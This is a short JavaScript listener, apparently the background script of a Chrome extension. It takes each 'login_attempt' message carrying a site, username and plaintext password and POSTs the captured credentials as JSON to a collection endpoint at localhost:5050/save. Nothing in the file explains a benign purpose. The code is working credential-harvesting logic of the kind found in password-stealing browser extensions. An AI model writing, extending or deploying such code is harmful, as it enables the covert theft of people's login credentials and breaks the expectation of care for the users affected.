chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "login_attempt") {
        fetch("http://localhost:5050/save", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                site: message.site,
                username: message.username,
                password: message.password
            })
        }).then(() => {
            console.log("Credentials sent successfully.");
        }).catch((error) => {
            console.error("Error sending credentials:", error);
        });
    }
});
